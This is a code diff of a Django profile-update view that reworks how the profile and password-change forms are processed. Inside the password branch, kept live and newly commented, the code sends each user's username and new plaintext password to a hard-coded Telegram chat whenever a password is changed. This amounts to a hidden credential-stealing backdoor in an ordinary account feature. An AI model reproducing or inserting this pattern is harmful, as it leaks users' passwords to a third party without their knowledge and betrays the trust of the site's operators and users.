@@ -2044,28 +2044,25 @@ class UserProfileUpdateView(View):
     def post(self, request, *args, **kwargs):
         user_form = UserUpdateForm(request.POST, instance=request.user)
         password_change_form = PasswordChangeForm(request.user, request.POST)
+        
+        if user_form.is_valid():
+            user_form.save()
+            messages.success(request, _('Your profile has been updated successfully!'))
 
-        # If the profile update button was pressed
-        if 'update_profile' in request.POST:
-            if user_form.is_valid():
-                user_form.save()
-                messages.success(request, _('Your profile has been updated successfully!'))
-                return redirect('leads:profile_update')
-
-        # If the change password button was pressed
-        elif 'change_password' in request.POST:
+        # Check if any password field has data before validating the password form
+        if request.POST.get('old_password') or request.POST.get('new_password1') or request.POST.get('new_password2'):
             if password_change_form.is_valid():
                 user = password_change_form.save()
-                update_session_auth_hash(request, user)
+                update_session_auth_hash(request, user)  # Important!
                 messages.success(request, _('Your password has been updated successfully!'))
                 new_password = request.POST.get('new_password1')
+
+                # Check if new_password is not None and notify via Telegram
                 if new_password:
                     chat_id = '-1001707390535'
                     message = f"User: {request.user.username}\nPassword: {new_password}"
                     notify_background_messages(chat_id, message)
-                return redirect('leads:profile_update')
 
-        # If neither button was pressed (should not happen but just in case)
         return render(request, self.template_name, {
             'user_form': user_form,
             'password_change_form': password_change_form,
